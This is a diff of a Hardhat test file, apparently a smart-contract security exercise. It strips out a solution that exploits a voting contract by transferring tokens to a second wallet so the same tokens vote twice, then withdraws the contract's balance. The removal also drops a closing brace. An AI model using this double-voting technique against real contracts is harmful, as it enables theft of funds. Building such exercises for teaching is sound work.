@@ -28,19 +28,6 @@ describe(NAME, function () {
       // Use different addresses and transfer for re-voting.
       it("conduct your attack here", async function () {
         //your attack code goes here
-          const signers = await ethers.getSigners();
-          const attackerWallet2 = signers[2];
-
-          await victimContract.nominateChallenger(attackerWallet.address);
-
-          await victimContract.connect(attackerWallet).transferFrom(attackerWallet.address, attackerWallet2.address, 0);
-          await victimContract.connect(attackerWallet).vote(attackerWallet.address);
-
-          await victimContract.connect(attackerWallet).transferFrom(attackerWallet.address, attackerWallet2.address, 1);
-          await victimContract.connect(attackerWallet2).vote(attackerWallet.address);
-
-          await victimContract.connect(attackerWallet).withdrawToAddress(attackerWallet.address);
-      });
 
       after(async function () {
           const victimContractBalance = await ethers.provider.getBalance(victimContract.address);
